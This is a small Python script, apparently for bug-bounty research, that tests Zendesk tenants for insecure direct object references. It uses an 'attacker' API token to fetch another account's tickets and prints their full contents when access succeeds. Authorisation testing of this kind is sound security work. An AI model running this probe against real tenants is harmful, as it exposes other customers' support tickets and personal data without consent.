import requests
import json
import argparse

class ZendeskTester:
    def __init__(self, subdomain, email, token):
        self.base_url = f"https://{subdomain}.zendesk.com/api/v2"
        self.auth = (f"{email}/token", token)
        self.session = requests.Session()

    def check_ticket(self, ticket_id):
        url = f"{self.base_url}/tickets/{ticket_id}.json"
        response = self.session.get(url, auth=self.auth)
        return response

    def check_user(self, user_id):
        url = f"{self.base_url}/users/{user_id}.json"
        response = self.session.get(url, auth=self.auth)
        return response

def test_idor(target_subdomain, attacker_email, attacker_token, target_ticket_id):
    print(f"[*] Testing IDOR on {target_subdomain} for Ticket ID: {target_ticket_id}")
    tester = ZendeskTester(target_subdomain, attacker_email, attacker_token)

    res = tester.check_ticket(target_ticket_id)

    if res.status_code == 200:
        print(f"[!] VULNERABLE: Successfully accessed ticket {target_ticket_id} on {target_subdomain}")
        print(json.dumps(res.json(), indent=2))
        return True
    elif res.status_code == 403 or res.status_code == 404:
        print(f"[+] Secure: Received {res.status_code} when accessing ticket {target_ticket_id}")
        return False
    else:
        print(f"[-] Unexpected response: {res.status_code}")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Zendesk IDOR Testing Tool (Legal Research)")
    parser.add_argument("--subdomain", required=True, help="Target subdomain (e.g., bb-test2)")
    parser.add_argument("--email", required=True, help="Attacker email")
    parser.add_argument("--token", required=True, help="Attacker API token")
    parser.add_argument("--id", required=True, help="Target Object ID to test")

    args = parser.parse_args()

    test_idor(args.subdomain, args.email, args.token, args.id)
